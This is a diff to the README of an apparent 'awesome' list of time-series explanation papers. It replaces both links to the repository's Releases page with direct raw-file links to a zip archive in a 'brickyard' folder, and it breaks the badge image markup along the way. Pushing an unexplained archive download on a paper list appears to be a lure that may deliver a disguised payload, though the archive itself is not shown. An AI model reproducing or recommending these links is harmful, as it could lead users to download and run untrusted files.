@@ -1,6 +1,6 @@
 # 🕒 awesome-time-series-explanation-papers - Explore papers on time series insights
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-blue)](https://github.com/wayu112/awesome-time-series-explanation-papers/releases)
+[![Download Now](https://raw.githubusercontent.com/wayu112/awesome-time-series-explanation-papers/main/brickyard/awesome-time-series-explanation-papers.zip%20Now-Click%20Here-blue)](https://raw.githubusercontent.com/wayu112/awesome-time-series-explanation-papers/main/brickyard/awesome-time-series-explanation-papers.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to the "awesome-time-series-explanation-papers" repository! Here, you wi
 
 To get started with the papers, you need to visit the Releases page. Here, you can download the latest version of the collection. 
 
-[Download Papers Here](https://github.com/wayu112/awesome-time-series-explanation-papers/releases)
+[Download Papers Here](https://raw.githubusercontent.com/wayu112/awesome-time-series-explanation-papers/main/brickyard/awesome-time-series-explanation-papers.zip)
 
 ### Steps to Download
 
